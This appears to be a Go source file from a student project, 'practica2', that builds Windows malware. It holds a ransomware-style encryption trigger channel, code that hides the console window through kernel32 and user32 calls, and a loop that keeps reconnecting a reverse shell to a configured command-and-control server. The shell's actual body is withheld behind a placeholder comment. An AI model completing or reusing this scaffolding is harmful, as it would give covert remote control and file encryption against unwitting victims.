package utils

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"syscall"
	"time"

	"practica2/config"
)

// Canal para comunicar eventos de cifrado
var encryptionTrigger chan bool

func init() {
	encryptionTrigger = make(chan bool, 1)
}

// GetEncryptionTrigger devuelve el canal de disparo de cifrado
func GetEncryptionTrigger() <-chan bool {
	return encryptionTrigger
}

func hideWindow() {
	// No ocultar ventana en modo debug para poder ver la salida
	if config.EnableDebugMode {
		return
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")

	if hwnd, _, _ := getConsoleWindow.Call(); hwnd != 0 {
		showWindow.Call(hwnd, 0) // SW_HIDE = 0
	}
}

// Shell Reverse TCP - establece conexión con servidor C2 y procesa comandos
func Reverse(host string) {
	/*
	 * [SECURITY PLACEHOLDER]
	 * The actual implementation of the reverse shell (C2 communication,
	 * remote command execution, and encryption triggers) has been withheld 
	 * from this public repository for security and responsibility reasons.
	 */
}

// StartReverseShell inicia la reverse shell
func StartReverseShell() {
	hideWindow()
	config.DebugPrintln("[*] Iniciando reverse shell...")

	for {
		time.Sleep(time.Duration(config.ReverseShellRetryDelay) * time.Second)
		Reverse(config.ReverseShellServer)
	}
}
